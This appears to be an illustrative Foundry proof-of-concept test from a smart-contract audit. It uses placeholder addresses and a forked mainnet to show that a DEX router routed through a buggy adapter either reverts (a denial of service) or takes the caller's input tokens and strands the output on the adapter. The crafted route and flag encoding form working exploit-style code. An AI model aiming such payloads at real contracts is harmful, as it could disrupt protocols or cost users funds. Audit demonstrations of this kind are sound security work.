```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

// ILLUSTRATIVE EXAMPLE

import { Test, console2 } from "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IExampleRouterTypes {
    struct BaseRequest {
        uint256 fromToken;
        address toToken;
        uint256 fromTokenAmount;
        uint256 minReturnAmount;
        uint256 deadLine;
    }
    struct RouterPath {
        address[] mixAdapters;
        address[] assetTo;
        uint256[] rawData;
        bytes[] extraData;
        uint256 fromToken;
    }
    struct PMMSwapRequest {
        uint256 pathIndex;
        address payer;
        address fromToken;
        address toToken;
        uint256 fromTokenAmountMax;
        uint256 toTokenAmountMax;
        uint256 salt;
        uint256 deadLine;
        bool isPushOrder;
        bytes extension;
    }
}

interface IExampleRouter is IExampleRouterTypes {
    function smartSwapByOrderId(
        uint256 orderId,
        BaseRequest calldata baseRequest,
        uint256[] calldata batchesAmount,
        RouterPath[][] calldata batches,
        PMMSwapRequest[] calldata extraData
    ) external payable returns (uint256 returnAmount);
}

contract Example_RoutingDoS is Test {
    address constant DEX_ROUTER = address(0x2001);
    address constant TOKEN_APPROVE_PROXY = address(0x2002);
    address constant TOKEN_APPROVE = address(0x2003);
    address constant BUGGY_ADAPTER = address(0x2004);
    address constant INPUT_TOKEN = address(0x2005);
    address constant OUTPUT_TOKEN = address(0x2006);

    uint256 constant D_FLAG = 1 << 247;

    IExampleRouter router;
    IERC20 inputToken;
    IERC20 outputToken;
    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        router = IExampleRouter(DEX_ROUTER);
        inputToken = IERC20(INPUT_TOKEN);
        outputToken = IERC20(OUTPUT_TOKEN);
        attacker = makeAddr("attacker");

        deal(INPUT_TOKEN, attacker, 10 ether, true);
    }

    function test_route_reverts_minReturnNotReached() public {
        vm.startPrank(attacker);
        inputToken.approve(TOKEN_APPROVE, type(uint256).max);

        uint256 amountIn = 1 ether;

        IExampleRouter.BaseRequest memory baseRequest = IExampleRouter.BaseRequest({
            fromToken: uint256(uint160(INPUT_TOKEN)),
            toToken: OUTPUT_TOKEN,
            fromTokenAmount: amountIn,
            minReturnAmount: 1,
            deadLine: block.timestamp + 600
        });

        uint256[] memory batchesAmount = new uint256[](1);
        batchesAmount[0] = amountIn;

        IExampleRouter.RouterPath[][] memory batches = _buildRoute(0);

        IExampleRouter.PMMSwapRequest[] memory extraPmm = new IExampleRouter.PMMSwapRequest[](0);

        uint256 inputBefore = inputToken.balanceOf(attacker);

        vm.expectRevert(bytes("Min return not reached"));
        router.smartSwapByOrderId(1, baseRequest, batchesAmount, batches, extraPmm);

        vm.stopPrank();

        assertEq(inputToken.balanceOf(attacker), inputBefore, "input consumed");
        assertEq(outputToken.balanceOf(attacker), 0, "output delivered");

        console2.log("revert proves DoS on route", amountIn);
    }

    function test_route_succeeds_strands_output_on_adapter() public {
        vm.startPrank(attacker);
        inputToken.approve(TOKEN_APPROVE, type(uint256).max);

        uint256 amountIn = 1 ether;

        IExampleRouter.BaseRequest memory baseRequest = IExampleRouter.BaseRequest({
            fromToken: uint256(uint160(INPUT_TOKEN)),
            toToken: OUTPUT_TOKEN,
            fromTokenAmount: amountIn,
            minReturnAmount: 0,
            deadLine: block.timestamp + 600
        });

        uint256[] memory batchesAmount = new uint256[](1);
        batchesAmount[0] = amountIn;

        IExampleRouter.RouterPath[][] memory batches = _buildRoute(0);

        IExampleRouter.PMMSwapRequest[] memory extraPmm = new IExampleRouter.PMMSwapRequest[](0);

        uint256 inputAttackerBefore = inputToken.balanceOf(attacker);
        uint256 outputAttackerBefore = outputToken.balanceOf(attacker);
        uint256 outputAdapterBefore = outputToken.balanceOf(BUGGY_ADAPTER);

        router.smartSwapByOrderId(1, baseRequest, batchesAmount, batches, extraPmm);

        vm.stopPrank();

        uint256 inputTaken = inputAttackerBefore - inputToken.balanceOf(attacker);
        uint256 outputReceived = outputToken.balanceOf(attacker) - outputAttackerBefore;
        uint256 outputStranded = outputToken.balanceOf(BUGGY_ADAPTER) - outputAdapterBefore;

        assertEq(inputTaken, amountIn, "input not charged");
        assertEq(outputReceived, 0, "output delivered");
        assertGt(outputStranded, 0, "nothing stranded");

        console2.log("input taken from attacker", inputTaken);
        console2.log("output delivered to attacker", outputReceived);
        console2.log("output stranded on adapter", outputStranded);
    }

    function _buildRoute(uint256 minOut) private pure returns (IExampleRouter.RouterPath[][] memory batches) {
        address[] memory mixAdapters = new address[](1);
        mixAdapters[0] = BUGGY_ADAPTER;

        address[] memory assetTo = new address[](1);
        assetTo[0] = BUGGY_ADAPTER;

        uint256[] memory rawData = new uint256[](1);
        rawData[0] = (uint256(10_000) << 160) | uint256(uint160(INPUT_TOKEN));

        bytes[] memory extraData = new bytes[](1);
        extraData[0] = abi.encode(D_FLAG | (minOut & ((1 << 128) - 1)));

        IExampleRouter.RouterPath memory path = IExampleRouter.RouterPath({
            mixAdapters: mixAdapters,
            assetTo: assetTo,
            rawData: rawData,
            extraData: extraData,
            fromToken: uint256(uint160(INPUT_TOKEN))
        });

        IExampleRouter.RouterPath[] memory hop = new IExampleRouter.RouterPath[](1);
        hop[0] = path;

        batches = new IExampleRouter.RouterPath[][](1);
        batches[0] = hop;
    }
}
```